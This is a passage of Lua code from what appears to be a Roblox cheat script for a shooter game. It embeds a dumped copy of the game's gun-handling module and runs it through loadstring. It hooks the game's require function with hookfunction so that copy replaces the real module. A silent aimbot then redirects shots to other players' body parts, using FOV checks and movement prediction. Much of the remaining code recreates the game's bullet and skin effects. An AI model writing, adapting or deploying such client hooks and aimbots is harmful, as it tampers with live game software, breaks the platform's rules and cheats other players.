			v14.Anchored = true
			v14.CanCollide = false
			v14.CanQuery = false
			v14.CFrame = CFrame.new(v6, v9)

			local v22 = v14.CFrame * CFrame.new(0, 0, -magnitude)

			v14.Parent = workspace.Ignored.Siren.Radius
			task.delay(v1 + 5, function()
				v14:Destroy()
				v14 = nil
			end)

			if v14:GetAttribute("SpecialEffects") then
				for k, v in pairs(v14:GetDescendants()) do
					if v:IsA("Trail") and v:GetAttribute("ColorRandom") then
						v.Color = ColorSequence.new(evalColorSequence(v:GetAttribute("ColorRandom"), math.random()))
					end
				end
			end

			local v42 = game:GetService("TweenService"):Create(v14, TweenInfo.new(0.05, Enum.EasingStyle.Linear), {
				CFrame = v14.CFrame * CFrame.new(0, 0, -0.1)
			})

			v42:Play()
			task.wait(0.05)

			if v42.PlaybackState ~= Enum.PlaybackState.Completed then
				v42:Pause()
			end

			local v5 = nil

			if _G.Reduce_Lag and not v14:GetAttribute("NoSlow") or v14:GetAttribute("LOWGFX") then
				v14.CFrame = v22
			else
				local v62 = game:GetService("TweenService"):Create(v14, TweenInfo.new(v1, Enum.EasingStyle.Linear), {
					CFrame = v22
				})

				v62:Play()
				task.wait(v1)
				v5 = v62
			end

			if v14:FindFirstChild("Impact") and (v8 and (v10 and not v8.Parent:FindFirstChild("Humanoid"))) then
				if v5 and v5.PlaybackState ~= Enum.PlaybackState.Completed then
					task.wait(0.05)
				end

				if not v14:FindFirstChild("NoNormal") then
					v14.CFrame = CFrame.new(v9, v9 - v10)
				end

				for k, v in pairs(v14.Impact:GetChildren()) do
					if v:IsA("ParticleEmitter") then
						v:Emit(v:GetAttribute("EmitCount") or 1)
					end
				end
			else
				for k, v in pairs(v14:GetChildren()) do
					if v:IsA("BasePart") then
						v.Transparency = 1
					end
				end
			end

			if v14 then
				for k, v in pairs(v14:GetDescendants()) do
					if v:IsA("ParticleEmitter") then
						v.Enabled = false
					end
				end
			end
		elseif v8 and (v8:IsDescendantOf(workspace.MAP) and (not v4 and (v2 and (SkinAssets.GunBeam:FindFirstChild(v2) and SkinAssets.GunBeam[v2]:FindFirstChild("Impact"))))) then
			local v7 = SkinAssets.GunBeam[v2].Impact:Clone()

			v7.Parent = workspace.Ignored
			v7:PivotTo(CFrame.new(v9, v9 + v10 * 5) * CFrame.Angles(-1.5707963267948966, 0, 0))

			for k, v in pairs(v7:GetDescendants()) do
				if v:IsA("ParticleEmitter") then
					v:Emit(v:GetAttribute("EmitCount") or 1)
				end
			end

			task.delay(1.5, function()
				v7:Destroy()
				v7 = nil
			end)
		end

		local PointLight = Instance.new("PointLight")

		PointLight.Brightness = 0.5
		PointLight.Range = 15
		PointLight.Shadows = true
		PointLight.Color = Color3.new(255 / 255, 255 / 255, 255 / 255)
		PointLight.Parent = BULLET_RAYS

		local ShootBBGUI = Handle:FindFirstChild("ShootBBGUI")

		if not ShootBBGUI or v13 then
			return
		end

		local Shoot = ShootBBGUI:FindFirstChild("Shoot")

		if not Shoot then
			return
		end

		Shoot.Size = UDim2.new(0, 0, 0, 0)
		Shoot.ImageTransparency = 1
		Shoot.Visible = true
		TweenService:Create(Shoot, TweenInfo.new(0.4, Enum.EasingStyle.Bounce, Enum.EasingDirection.In, 0, false, 0), {
			ImageTransparency = 0.4,
			Size = UDim2.new(1, 0, 1, 0)
		}):Play()
		TweenService:Create(PointLight, TweenInfo.new(0.4, Enum.EasingStyle.Bounce, Enum.EasingDirection.In, 0, false, 0), {
			Range = 0
		}):Play()
		wait(0.4)
		BULLET_RAYS:Destroy()
		TweenService:Create(Shoot, TweenInfo.new(0.2, Enum.EasingStyle.Bounce, Enum.EasingDirection.In, 0, false, 0), {
			ImageTransparency = 1,
			Size = UDim2.new(1, 0, 1, 0)
		}):Play()
		wait(0.2)
		Shoot.Visible = false
	end)
	NewGunBeam.Attachment0 = Attachment
	NewGunBeam.Attachment1 = Attachment2
	NewGunBeam.Name = "NewGunBeam"
	NewGunBeam.Parent = BULLET_RAYS

	if Shooter == LocalPlayer.Character and workspace:GetServerTimeNow() - v7 > 0.95 then
		playerShot(Handle)
	end

	if not t4[Handle] then
		local v39 = v2 or "None"

		task.spawn(GunSoundPlay.SoundPlay, Handle, t2[v39] ~= "All" and not (t2[v39] and t2[v39][Handle.Parent.Name]), v4)
		t4[Handle] = true
		task.delay(0.021, function()
			t4[Handle] = nil
		end)
	end

	task.spawn(function()
		if not Handle:GetAttribute("DualWield") or IsLeftHand then
			return
		end

		t3.shoot({
			IsLeftHand = true,
			Shooter = Shooter,
			Handle = Handle,
			ForcedOrigin = Handle.Parent.Default.Mesh.DualWieldLeftHandMesh.LeftMuzzle.WorldPosition,
			AimPosition = v9,
			BeamColor = BeamColor,
			Hit = Hit,
			Range = v1
		})
	end)

	return v9, v8, v10
end

return t3
]=]

local function TryLoadEmulatedGunHandler()
	if EmulatedGunHandlerAttempted then
		return EmulatedGunHandler;
	end;
	EmulatedGunHandlerAttempted = true;

	if type(loadstring) ~= 'function' then
		return nil;
	end;

	if type(EmbeddedGunHandlerSource) ~= 'string' or EmbeddedGunHandlerSource == '' then
		return nil;
	end;

	local chunk, compileErr = loadstring(EmbeddedGunHandlerSource, '@embedded dumped gunhandler.lua');
	if not chunk then
		warn('gravity error: gunhandler emulation failed;', compileErr);
		return nil;
	end;

	local fakeScript = {
		CanShoot = function()
			return CanShoot;
		end,
	};

	local fakeEnv = setmetatable({
		script = fakeScript,
		require = function(target)
			if target == fakeScript.CanShoot then
				return CanShoot;
			end;
			return require(target);
		end,
	}, {
		__index = function(_, key)
			return getfenv()[key];
		end,
		__newindex = function(_, key, value)
			getfenv()[key] = value;
		end,
	});

	setfenv(chunk, fakeEnv);

	local okExec, result = pcall(chunk);
	if not okExec or type(result) ~= 'table' or type(result.shoot) ~= 'function' or type(result.getAim) ~= 'function' then
		warn('gravity error: gunhandler emulation failed;', result);
		return nil;
	end;

	EmulatedGunHandler = result;
	shared.__luxx_emulated_gunhandler = true;
	return EmulatedGunHandler;
end;

do
	local hookFn = hookfunction or (getgenv and getgenv().hookfunction);
	if hookFn and not shared.__luxx_require_gunhandler_hooked then
		local oldRequire;
		oldRequire = hookFn(require, function(target)
			local ModulesFolder = ReplicatedStorage:FindFirstChild('Modules');
			local GunHandlerModule = ModulesFolder and ModulesFolder:FindFirstChild('GunHandler');
			if GunHandlerModule and target == GunHandlerModule then
				local Emu = TryLoadEmulatedGunHandler();
				if Emu then
					shared.__luxx_require_gunhandler_source = 'emulated';
					return Emu;
				end;
			end;
			return oldRequire(target);
		end);
		shared.__luxx_require_gunhandler_hooked = true;
	end;
end;

AutoWeapons = {
	['[SMG]'] = true,
	['[Rifle]'] = true,
	['[Shotgun]'] = true, 
	['[AK47]'] = true,
	['[AR]'] = true,
	['[Drum-Shotgun]'] = true,
	['[DrumGun]'] = true,
	['[LMG]'] = true,
	['[P90]'] = true,
	['[SilencerAR]'] = true,
};

BurstWeapons = {
	['[AUG]'] = true,
};

ShootRayParams = RaycastParamsNew();
ShootRayParams.FilterType = EnumExclude;
ShootRayParams.IgnoreWater = true;

CanShootCheck = function(Character, IsAutoShoot)
	if not Character then return false end;
	local Humanoid = Character:FindFirstChild('Humanoid');
	if not Humanoid or Humanoid.Health <= 0 or Humanoid:GetState() == EnumDead then return false end;
	local BodyEffects = Character:FindFirstChild('BodyEffects');
	if not BodyEffects then return false end;
	local Tool = Character:FindFirstChildOfClass('Tool');
	if not Tool or not Tool:FindFirstChild('Handle') or not Tool:FindFirstChild('Ammo') then return false end;
	if Tool.Ammo.Value <= 0 then return false end;
	if Character:FindFirstChild('FULLY_LOADED_CHAR') == nil then return false end;
	if Character:FindFirstChild('FORCEFIELD') then return false end;
	if Character:FindFirstChild('GRABBING_CONSTRAINT') then return false end;
	if Character:FindFirstChild('Christmas_Sock') then return false end;
	if BodyEffects:FindFirstChild('Cuff') and BodyEffects.Cuff.Value then return false end;
	if BodyEffects:FindFirstChild('Attacking') and BodyEffects.Attacking.Value then return false end;
	if BodyEffects:FindFirstChild('K.O') and BodyEffects['K.O'].Value then return false end;
	if BodyEffects:FindFirstChild('Grabbed') and BodyEffects.Grabbed.Value then return false end;
	if BodyEffects:FindFirstChild('Reload') and BodyEffects.Reload.Value then return false end;
	if BodyEffects:FindFirstChild('Dead') and BodyEffects.Dead.Value then return false end;
	if BodyEffects:FindFirstChild('Block') then return false end;
	if not IsAutoShoot and Tool:GetAttribute('Cooldown') then return false end;
	local LastShot = Character:GetAttribute('LastGunShot');
	local IsShotgun = Tool.Name == '[Shotgun]' or Tool.Name == '[Double-Barrel SG]' or Tool.Name == 'TacticalShotgun' or Tool.Name == 'Drum-Shotgun';
	if LastShot ~= Tool.Name and Character:GetAttribute('ShotgunDebounce') then return false end;
	return true;
end;

CanShoot = function(Character)
	if not CanShootCheck(Character) then return false end;
	local Tool = Character:FindFirstChildOfClass('Tool');
	local IsShotgun = Tool.Name == '[Shotgun]' or Tool.Name == '[Double-Barrel SG]' or Tool.Name == 'TacticalShotgun' or Tool.Name == 'Drum-Shotgun';
	if IsShotgun and not Character:GetAttribute('ShotgunDebounce') then
		Character:SetAttribute('ShotgunDebounce', true);
		task.delay(0.65, function()
			Character:SetAttribute('ShotgunDebounce', nil);
		end);
	end;
	Character:SetAttribute('LastGunShot', Tool.Name);
	return true;
end;

GetMuzzlePosition = function(Tool)
	local Handle = Tool:FindFirstChild('Handle');
	if not Handle then return nil end;
	local Offset = MuzzleOffsets[Tool.Name] or CFrameNew(0, 0.4, 1.8);
	local FallbackPos = (Handle.CFrame * Offset).Position;
	local Default = Tool:FindFirstChild('Default');
	if Default then
		local Mesh = Default:FindFirstChild('Mesh');
		if Mesh then
			local Muzzle = Mesh:FindFirstChild('Muzzle');
			if Muzzle then return Muzzle.WorldPosition end;
		end;
	end;

	local HandleMuzzle = Handle:FindFirstChild('Muzzle');
	if HandleMuzzle then return HandleMuzzle.WorldPosition end;

	return FallbackPos;
end;

GetClosestPartToCursor = function(Character)
	local CurrentCamera = Workspace.CurrentCamera;
	local MousePosition = UserInputService:GetMouseLocation();
	local Closest = nil;
	local BestDist = MathHuge;
	for _, Part in next, Character:GetChildren() do
		if not Part:IsA('BasePart') then continue end;
		local ScreenPos, OnScreen = CurrentCamera:WorldToViewportPoint(Part.Position);
		if not OnScreen then continue end;
		local Dist = (MousePosition - Vector2New(ScreenPos.X, ScreenPos.Y)).Magnitude;
		if Dist < BestDist then
			BestDist = Dist;
			Closest = Part;
		end;
	end;
	return Closest;
end;

GetClosestPointOnPart = function(Part, Scale)
	local MousePos = UserInputService:GetMouseLocation();
	local Ray = Camera:ViewportPointToRay(MousePos.X, MousePos.Y);
	local Intersection = Ray.Origin + Ray.Direction * Ray.Direction:Dot(Part.Position - Ray.Origin);
	local LocalPos = Part.CFrame:PointToObjectSpace(Intersection);
	local Half = (Part.Size * (Scale or 1)) / 2;
	return Part.CFrame * Vector3New(
		MathClamp(LocalPos.X, -Half.X, Half.X),
		MathClamp(LocalPos.Y, -Half.Y, Half.Y),
		MathClamp(LocalPos.Z, -Half.Z, Half.Z)
	);
end;

local ResolveHitPosition = function(TargetChar, FeatureCfg)
	FeatureCfg = FeatureCfg or {};
	local HitPartCfg = FeatureCfg['Hit Part'] or FeatureCfg['Target Part'];
	local PartName = (type(HitPartCfg) == 'table' and HitPartCfg['Part']) or HitPartCfg or 'HumanoidRootPart';
	local ClosestPointCfg = (type(HitPartCfg) == 'table' and HitPartCfg['Closest Point']) or FeatureCfg['Closest Point'] or nil;
	local ClosestPoint = false;
	local PointScale = nil;

	if type(ClosestPointCfg) == 'table' and ClosestPointCfg['Mode'] == 'Scaled' then
		PointScale = 1 - (MathClamp(ClosestPointCfg['Scale'] or 0, 0, 100) / 100);
	end;

	if PartName == 'Closest Point' then
		ClosestPoint = true;
		PartName = 'Closest';
	elseif PartName == 'Closest Part' then
		ClosestPoint = false;
		PartName = 'Closest';
	end;

	local Part;
	if PartName == 'Closest' then
		Part = GetClosestPartToCursor(TargetChar);
	else
		Part = TargetChar:FindFirstChild(PartName);
	end;

	if Part then
		local Pos = ClosestPoint and GetClosestPointOnPart(Part, PointScale) or Part.Position;
		return Pos, Part;
	end;

	local Fallback = TargetChar:FindFirstChild('HumanoidRootPart');
	if Fallback then
		local Pos = ClosestPoint and GetClosestPointOnPart(Fallback, PointScale) or Fallback.Position;
		return Pos, Fallback;
	end;
	return nil, nil;
end;

local GetAimPosition = function(MuzzlePos, Range)
	local SilentCfg = GetConfig()['Silent Aimbot'];
	if SilentCfg['Enabled'] and State.Targets.Silent and PassesConditions(State.Targets.Silent, 'Silent Aimbot') then
		local Target = State.Targets.Silent;
		local TargetChar = Target.Character;
		if TargetChar then
			local HumanoidRootPart = TargetChar:FindFirstChild('HumanoidRootPart');
			if HumanoidRootPart then
				local CurrentCamera = Workspace.CurrentCamera;
				local MaxRange = SilentCfg['Max Distance'];
				if MaxRange and MaxRange < MathHuge then
					local WorldDist = (CurrentCamera.CFrame.Position - HumanoidRootPart.Position).Magnitude;
					if WorldDist > MaxRange then return Mouse.Hit.Position end;
				end;
				local ScreenPos, OnScreen = CurrentCamera:WorldToViewportPoint(HumanoidRootPart.Position);
				if OnScreen and ScreenPos.Z > 1 then
					local PassFOV = true;
					local SilentFOVCfg = GetConfig()['Silent Aimbot']['FOV'];
					if SilentFOVCfg and (SilentFOVCfg['Visible'] or SilentFOVCfg['Visualize']) and (SilentFOVCfg['Visible'] or SilentFOVCfg['Visualize'])['Enabled'] then
						local MousePosition = UserInputService:GetMouseLocation();
						local ViewportY = CurrentCamera.ViewportSize.Y;
						local CamFOV = CurrentCamera.FieldOfView;
						local ScaleFactor = (HumanoidRootPart.Size.Y * ViewportY) / (ScreenPos.Z * 2) * 80 / CamFOV;
						local W = GetFovSize(SilentFOVCfg['X'], 150) * ScaleFactor;
						local H = GetFovSize(SilentFOVCfg['Y'], 150) * ScaleFactor;
						local Delta = Vector2New(ScreenPos.X, ScreenPos.Y) - MousePosition;
						PassFOV = MathAbs(Delta.X) <= W / 2 and MathAbs(Delta.Y) <= H / 2;
					end;

					if PassFOV then
						local TargetPos, _ = ResolveHitPosition(TargetChar, SilentCfg);
						if not TargetPos then TargetPos = HumanoidRootPart.Position end;
						TargetPos = ApplyPrediction(TargetPos, Target, SilentCfg);
						return TargetPos;
					end;
				end;
			end;
		end;
	end;
	return Mouse.Hit.Position;
end;

local DefaultBeamColor = Color3.new(1, 0.545098, 0.14902);

local SoundsPlaying = {};
local IsAimed = false;

ScopedWeapons = {
	'[Shotgun]', '[Drum-Shotgun]', '[Rifle]', '[TacticalShotgun]',
	'[AR]', '[AUG]', '[AK47]', '[LMG]', '[SilencerAR]',
};

CustomBulletHoleRotations = {
	['SoulII'] = Vector3New(-90, 0, 0),
	['Sushi'] = 'Position',
	['XMAS'] = Vector3New(180, 0, 0),
	['Gift'] = Vector3New(180, 0, 0),
	['Jellyfish'] = Vector3New(180, 0, 0),
	['Halloween23'] = Vector3New(180, 0, 0),
	['Wild West'] = Vector3New(180, 0, 0),
	['Cat'] = Vector3New(180, 0, 0),
	['Ninja'] = Vector3New(180, 0, 0),
	['Void'] = Vector3New(180, 0, 0),
	['Ice'] = Vector3New(180, 0, 0),
	['Beary'] = { CFrameNew(0, 0, -0.45), Vector3New(180, 0, 0) },
	['XMAS24'] = Vector3New(-90, 0, 0),
	['Heartbreak'] = 'Position',
	['Blaze'] = 'Position',
	['Short Cake'] = 'Position',
	['Shrimp'] = Vector3New(-90, 0, 0),
	['Arcane'] = Vector3New(-90, 0, 0),
	['PrestigeCandyCane'] = 'Position',
	['Duck'] = 'Position',
	['Flower'] = Vector3New(180, 0, 0),
	['Car'] = Vector3New(180, 0, 0),
	['Music'] = Vector3New(180, 0, 0),
	['Brainrot'] = { CFrameNew(0, 0, -0.25), Vector3New(0, 0, 0) },
};

UndeadBeamColors = {
	Color3.fromRGB(248, 147, 255),
	Color3.fromRGB(255, 160, 64),
	Color3.fromRGB(76, 255, 82),
	Color3.fromRGB(110, 149, 255),
};

function DoMuzzleEmit(MuzzleSource, ShooterCharacter)
	Spawn(function()
		Xpcall(function()
			if not ShooterCharacter then return end;
			local Tool = ShooterCharacter:FindFirstChildOfClass('Tool');
			if not Tool then return end;
			local ToolHandle = Tool:FindFirstChild('Handle');
			if not ToolHandle then return end;
			local MuzzleAtt = (Tool:FindFirstChild('Default') and Tool.Default:FindFirstChild('Mesh') and Tool.Default.Mesh:FindFirstChild('Muzzle')) or ToolHandle:FindFirstChild('Muzzle');
			if not MuzzleAtt then return end;
			if ToolHandle:GetAttribute('Emitted') then return end;
			ToolHandle:SetAttribute('Emitted', true);
			Delay(0.05, function()
				if ToolHandle then ToolHandle:SetAttribute('Emitted', nil) end;
			end);
			for _, Emitter in next, MuzzleSource:GetChildren() do
				if Emitter:IsA('ParticleEmitter') then
					local Clone = Emitter:Clone();
					Clone.Parent = MuzzleAtt;
					Clone.Enabled = true;
					Clone:Emit(Clone:GetAttribute('EmitCount') or 1);
					Clone.Enabled = false;
					game.Debris:AddItem(Clone, 2);
				end;
			end;
		end, ErrHandler);
	end);
end;

CachedGunBeam = ReplicatedStorage:FindFirstChild('GunBeam');
CachedAnimChar = nil;
CachedShootAnim = nil;
CachedAimShootAnim = nil;

function Animate(Gun)
	if not Gun then return end;
	local Character = LocalPlayer.Character;
	if not Character or not Character:FindFirstChild('Humanoid') or not Character.Humanoid:FindFirstChild('Animator') then return end;
	if not CachedAnimations then CachedAnimations = ReplicatedStorage:FindFirstChild('Animations') or ReplicatedStorage:FindFirstChild('ClientAnimations') end;
	if not CachedAnimations then return end;
	local GunCombat = CachedAnimations:FindFirstChild('GunCombat');
	if not GunCombat then return end;
	local Animator = Character.Humanoid.Animator;
	if CachedAnimChar ~= Character then
		CachedAnimChar = Character;
		CachedShootAnim = Animator:LoadAnimation(GunCombat.Shoot);
		CachedAimShootAnim = Animator:LoadAnimation(GunCombat.AimShoot);
	end;
	if CachedShootAnim then CachedShootAnim:Stop(0) end;
	if CachedAimShootAnim then CachedAimShootAnim:Stop(0) end;
	if IsAimed or table.find(ScopedWeapons, Gun.Name) then
		CachedAimShootAnim:Play();
	else
		CachedShootAnim:Play();
	end;
end;

ShowPellet = function(Shooter, Handle, ForcedOrigin, AimPosition, Range, BeamColor, SkipVisual)
	BeamColor = BeamColor or DefaultBeamColor;
	local Direction = (AimPosition - ForcedOrigin).Unit;

	ShootRayParams.FilterDescendantsInstances = BuildFilter(ShootFilter, Shooter);

	local RayResult = Workspace:Raycast(ForcedOrigin, Direction * Range, ShootRayParams);
	local HitPosition = RayResult and RayResult.Position or (ForcedOrigin + Direction * Range);
	local HitNormal = RayResult and RayResult.Normal or nil;
	local HitInstance = RayResult and RayResult.Instance or nil;

	if SkipVisual then
		return HitPosition, HitInstance, HitNormal;
	end;

	local ToolName = Handle and Handle.Parent and Handle.Parent.Name or '';
	local SkinName = nil;
	Pcall(function()
		SkinName = Handle:GetAttribute('SkinName');
	end);
	if not SkinName or SkinName == '' then
		Pcall(function()
			local Decoded = HttpService:JSONDecode(LocalPlayer.DataFolder.Information.EquipSkins.Value);
			SkinName = Decoded and Decoded[ToolName] or nil;
		end);
	end;
	if not SkinName or SkinName == '' then
		SkinName = 'Default';
	end;

	local SkinAssets = CachedSkinAssets;
	local BulletPart = Instance.new('Part');
	BulletPart.Name = 'BULLET_RAYS';
	BulletPart.Anchored = true;
	BulletPart.CanCollide = false;
	BulletPart.CanTouch = false;
	BulletPart.CanQuery = false;
	BulletPart.Size = Vector3New(0, 0, 0);
	BulletPart.Transparency = 1;
	BulletPart.CFrame = CFrameNew(ForcedOrigin, HitPosition);
	BulletPart.Parent = (CachedIgnored and CachedIgnored:FindFirstChild('Siren') and CachedIgnored.Siren:FindFirstChild('Radius') and CachedIgnored.Siren.Radius) or CachedIgnored or Workspace;

	local GunBeamTemplate = CachedGunBeam;
	local LeftBeamTemplate = nil;
	local ImpactTemplate = nil;
	local IsDefaultBeam = false;

	if SkinAssets and SkinAssets:FindFirstChild('GunBeam') and SkinAssets.GunBeam:FindFirstChild(SkinName) then
		local SkinBeamFolder = SkinAssets.GunBeam[SkinName];
		if SkinBeamFolder:FindFirstChildOfClass('Beam') then
			if SkinBeamFolder:FindFirstChild('GunBeam') and SkinBeamFolder:FindFirstChild('LeftGunBeam') then
				GunBeamTemplate = SkinBeamFolder:FindFirstChild('GunBeam');
				LeftBeamTemplate = SkinBeamFolder:FindFirstChild('LeftGunBeam');
			else
				GunBeamTemplate = SkinBeamFolder:FindFirstChildOfClass('Beam');
			end;
			if SkinBeamFolder:FindFirstChild('Impact') then
				ImpactTemplate = SkinBeamFolder.Impact;
			end;
		elseif SkinBeamFolder:FindFirstChildWhichIsA('BasePart') then
			local PartBeam = SkinBeamFolder:FindFirstChildWhichIsA('BasePart');
			if PartBeam:FindFirstChild('Different_GunBeam') then
				local DiffFolder = PartBeam.Different_GunBeam;
				if DiffFolder:FindFirstChild(ToolName) then
					local WeaponBeam = DiffFolder[ToolName];
					if WeaponBeam:FindFirstChildWhichIsA('BasePart') then
						GunBeamTemplate = WeaponBeam:FindFirstChildWhichIsA('BasePart');
						if GunBeamTemplate:FindFirstChild('Impact') then
							ImpactTemplate = GunBeamTemplate.Impact;
						end;
					elseif WeaponBeam:FindFirstChildOfClass('Beam') then
						GunBeamTemplate = WeaponBeam:FindFirstChildOfClass('Beam');
						if WeaponBeam:FindFirstChild('Impact') then
							ImpactTemplate = WeaponBeam.Impact;
						end;
					else
						GunBeamTemplate = CachedGunBeam;
						IsDefaultBeam = true;
					end;
				end;
			else
				GunBeamTemplate = PartBeam;
				if PartBeam:FindFirstChild('Impact') then
					ImpactTemplate = PartBeam.Impact;
				end;
			end;
		else
			GunBeamTemplate = CachedGunBeam;
			IsDefaultBeam = true;
		end;
	else
		if not GunBeamTemplate and SkinAssets then
			local GunBeamFolder = SkinAssets:FindFirstChild('GunBeam');
			if GunBeamFolder then
				local DefaultFolder = GunBeamFolder:FindFirstChild('Default');
				if DefaultFolder then
					local BeamObj = DefaultFolder:FindFirstChildOfClass('Beam');
					if BeamObj then GunBeamTemplate = BeamObj end;
				end;
			end;
		end;
		IsDefaultBeam = true;
	end;

	local ClonedBeam = GunBeamTemplate and GunBeamTemplate:Clone() or nil;
	local BeamDistance = (HitPosition - ForcedOrigin).Magnitude;
	local TravelTime = BeamDistance / 725;
	if not ClonedBeam then
		game.Debris:AddItem(BulletPart, 0.5);
	elseif ClonedBeam:IsA('Beam') then
		game.Debris:AddItem(BulletPart, 0.5);
	else
		game.Debris:AddItem(BulletPart, TravelTime + 5);
	end;

	if ClonedBeam then
		local StartAttachment = Instance.new('Attachment');
		StartAttachment.Position = Vector3New(0, 0, 0);
		StartAttachment.Parent = BulletPart;
		local EndAttachment = Instance.new('Attachment');
		EndAttachment.Position = Vector3New(0, 0, -BeamDistance);
		EndAttachment.Parent = BulletPart;

		if ClonedBeam:IsA('Beam') then
			if IsDefaultBeam and BeamColor then
				ClonedBeam.Color = ColorSequence.new(BeamColor);
			end;
			ClonedBeam.Attachment0 = StartAttachment;
			ClonedBeam.Attachment1 = EndAttachment;
			ClonedBeam.Parent = BulletPart;
		elseif ClonedBeam:IsA('BasePart') then
			ClonedBeam.Anchored = true;
			ClonedBeam.CanCollide = false;
			ClonedBeam.CanQuery = false;
			ClonedBeam.CFrame = CFrameNew(ForcedOrigin, HitPosition);
			local BeamEndCFrame = ClonedBeam.CFrame * CFrameNew(0, 0, -BeamDistance);
			ClonedBeam.Parent = BulletPart.Parent;
			if ClonedBeam:GetAttribute('SpecialEffects') then
				for _, BeamDescendant in next, ClonedBeam:GetDescendants() do
					if BeamDescendant:IsA('Trail') and BeamDescendant:GetAttribute('ColorRandom') then
						local RandomColorSeq = BeamDescendant:GetAttribute('ColorRandom');
						BeamDescendant.Color = ColorSequence.new(Color3.new(RandomColorSeq.X, RandomColorSeq.Y, RandomColorSeq.Z):Lerp(Color3.new(1, 1, 1), MathRandom()));
					end;
				end;
			end;
			if SkinName == 'Undead' and ToolName == '[Revolver]' then
				local RandColor = UndeadBeamColors[MathRandom(1, #UndeadBeamColors)];
				local Trail = ClonedBeam:FindFirstChildOfClass('Trail');
				if Trail then
					Trail.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, RandColor), ColorSequenceKeypoint.new(1, RandColor) });
				end;
			end;
			Spawn(function()
				local InitialTween = TweenService:Create(ClonedBeam, TweenInfo.new(0.05, Enum.EasingStyle.Linear), {
					['CFrame'] = ClonedBeam.CFrame * CFrameNew(0, 0, -0.1),
				});
				InitialTween:Play();
				Wait(0.05);
				if InitialTween.PlaybackState ~= Enum.PlaybackState.Completed then
					InitialTween:Pause();
				end;
				local TravelTween = TweenService:Create(ClonedBeam, TweenInfo.new(TravelTime, Enum.EasingStyle.Linear), {
					['CFrame'] = BeamEndCFrame,
				});
				TravelTween:Play();
				Wait(TravelTime);
				if ClonedBeam:FindFirstChild('Impact') and (HitInstance and HitNormal and not HitInstance.Parent:FindFirstChild('Humanoid')) then
					if TravelTween.PlaybackState ~= Enum.PlaybackState.Completed then
						Wait(0.05);
					end;
					if not ClonedBeam:FindFirstChild('NoNormal') then
						ClonedBeam.CFrame = CFrameNew(HitPosition, HitPosition - HitNormal);
					end;
					for _, ImpactChild in next, ClonedBeam.Impact:GetChildren() do
						if ImpactChild:IsA('ParticleEmitter') then
							ImpactChild:Emit(ImpactChild:GetAttribute('EmitCount') or 1);
						end;
					end;
				else
					for _, BeamChild in next, ClonedBeam:GetChildren() do
						if BeamChild:IsA('BasePart') then
							BeamChild.Transparency = 1;
						end;
					end;
				end;
				if ClonedBeam then
					for _, Desc in next, ClonedBeam:GetDescendants() do
						if Desc:IsA('ParticleEmitter') then Desc.Enabled = false end;
					end;
				end;
			end);
		end;

		if LeftBeamTemplate then
			local SecondaryMesh = nil;
			local ToolModel = Handle and Handle.Parent;
			if ToolModel then
				local Default = ToolModel:FindFirstChild('Default');
				if Default then
					local Mesh = Default:FindFirstChild('Mesh');
					if Mesh then
						for _, Child in next, Mesh:GetChildren() do
							if Child:IsA('BasePart') and Child:GetAttribute('SecondaryMesh') then
								SecondaryMesh = Child;
							end;
						end;
					end;
				end;
			end;
			if SecondaryMesh then
				local LeftMuzzle = SecondaryMesh:FindFirstChild('LeftMuzzle') or SecondaryMesh:FindFirstChildOfClass('Attachment');
				if LeftMuzzle then
					local LeftMuzzlePos = LeftMuzzle.WorldPosition;
					local LeftBeamDist = (HitPosition - LeftMuzzlePos).Magnitude;
					local LeftTravelTime = LeftBeamDist / 725;
					local LeftPart = Instance.new('Part');
					LeftPart.Name = 'BULLET_RAYS';
					LeftPart.Size = Vector3New(0, 0, 0);
					LeftPart.Transparency = 1;
					LeftPart.CanCollide = false;
					LeftPart.CanTouch = false;
					LeftPart.CanQuery = false;
					LeftPart.Anchored = true;
					LeftPart.CFrame = CFrameNew(LeftMuzzlePos, HitPosition);
					LeftPart.Parent = BulletPart.Parent;
					local LeftClone = LeftBeamTemplate:Clone();
					if LeftClone:IsA('Beam') then
						local LAtt0 = Instance.new('Attachment');
						LAtt0.Position = Vector3New(0, 0, 0);
						LAtt0.Parent = LeftPart;
						local LAtt1 = Instance.new('Attachment');
						LAtt1.Position = Vector3New(0, 0, -LeftBeamDist);
						LAtt1.Parent = LeftPart;
						if IsDefaultBeam and BeamColor then
							LeftClone.Color = ColorSequence.new(BeamColor);
						end;
						LeftClone.Attachment0 = LAtt0;
						LeftClone.Attachment1 = LAtt1;
						LeftClone.Parent = LeftPart;
						game.Debris:AddItem(LeftPart, 0.5);
					elseif LeftClone:IsA('BasePart') then
						LeftClone.Anchored = true;
						LeftClone.CanCollide = false;
						LeftClone.CanQuery = false;
						LeftClone.CFrame = CFrameNew(LeftMuzzlePos, HitPosition);
						local LeftEndCFrame = LeftClone.CFrame * CFrameNew(0, 0, -LeftBeamDist);
						LeftClone.Parent = LeftPart.Parent;
						game.Debris:AddItem(LeftPart, LeftTravelTime + 5);
						Spawn(function()
							local LTw = TweenService:Create(LeftClone, TweenInfo.new(LeftTravelTime, Enum.EasingStyle.Linear), {
								['CFrame'] = LeftEndCFrame,
							});
							LTw:Play();
							Wait(LeftTravelTime);
							if LeftClone then
								for _, Desc in next, LeftClone:GetDescendants() do
									if Desc:IsA('ParticleEmitter') then Desc.Enabled = false end;
								end;
							end;
						end);
					end;
					Spawn(function()
						for _, Child in next, LeftMuzzle:GetChildren() do
							if Child:IsA('ParticleEmitter') then
								Child:Emit(Child:GetAttribute('EmitCount') or 1);
							end;
						end;
					end);
				end;
			end;
		end;

		Spawn(function()
			if RayResult and ImpactTemplate then
				Xpcall(function()
					if HitInstance and not HitInstance.Parent:FindFirstChildOfClass('Humanoid') then
						local BulletHole = Instance.new('Part');
						Delay(5, function() if BulletHole then BulletHole:Destroy() end end);
						BulletHole.Transparency = 1;
						BulletHole.Name = 'BULLETHOLE';
						BulletHole.Size = Vector3New(0.83, 0.731, 0.001);
						BulletHole.Anchored = true;
						BulletHole.CanCollide = false;
						BulletHole.CanTouch = false;
						BulletHole.CanQuery = false;
						local ImpactClone = ImpactTemplate:Clone();
						ImpactClone.Parent = BulletHole;
						local NormalOffset = HitNormal and (HitNormal * 0.1) or Vector3New(0, 0, 0);
						BulletHole.Position = HitPosition + NormalOffset;
						BulletHole.CFrame = CFrameNew(HitPosition + NormalOffset, HitPosition + (HitNormal or Vector3New(0, 1, 0)));
						local CustomRot = CustomBulletHoleRotations[SkinName];
						if CustomRot then
							if typeof(CustomRot) == 'string' then
								if CustomRot == 'Position' then
									ImpactClone.Position = BulletHole.Position;
								else
									ImpactClone.CFrame = BulletHole.CFrame;
								end;
